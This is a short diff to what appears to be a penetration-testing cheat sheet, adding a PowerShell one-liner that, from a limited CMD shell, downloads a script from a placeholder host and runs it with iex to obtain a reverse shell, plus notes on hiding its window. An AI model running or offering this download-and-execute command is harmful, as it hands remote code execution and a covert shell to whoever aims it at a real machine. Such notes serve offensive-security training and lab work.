@@ -33,6 +33,16 @@ Sending End
 
 # PowerShell
 
+Download & Execute New (Stable) Revshell from Limited CMD Shell
+```
+start /b "" powershell -c iex (new-object net.webclient).downloadstring('http://ipaddress/file')
+
+Notes:
+start is to prevent session from locking up.
+/b forces NO new window for the shell.
+"" sets an empty window title.
+```
+
 Invoke Web Request
 `Invoke-WebRequest "http://url/file" -OutFile "filepath\filename"`
 
